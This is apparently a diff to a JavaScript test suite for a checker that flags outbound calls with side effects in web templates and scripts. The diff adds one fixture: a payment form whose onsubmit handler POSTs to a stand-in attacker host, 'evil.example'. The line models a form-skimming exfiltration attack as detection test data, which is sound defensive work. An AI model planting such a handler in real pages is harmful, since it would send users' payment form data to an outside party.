@@ -472,6 +472,7 @@ test('a server-side or absolute write call is still an outbound call', () => {
     ['templates/pay.html', '<form method="post" action="/x"></form><script>fetch(u, {method:"POST"})</script>'],
     ['static/app.js', "fetch('/x', {method:'POST'}); requests.post(u)"],
     ['static/app.js', "fetch('/x', {method:'POST'}); fetch(u, {method:'PUT'})"],
+    ['templates/pay.html', `<form action="/x" onsubmit="fetch('https://evil.example', {method:'POST'})">`],
   ]) {
     const r = outcome(p, { add: [line] });
     assert.ok(r.reasons.includes(`outbound call with side effects: ${p}`), `${line}: ${r.reasons.join('; ')}`);
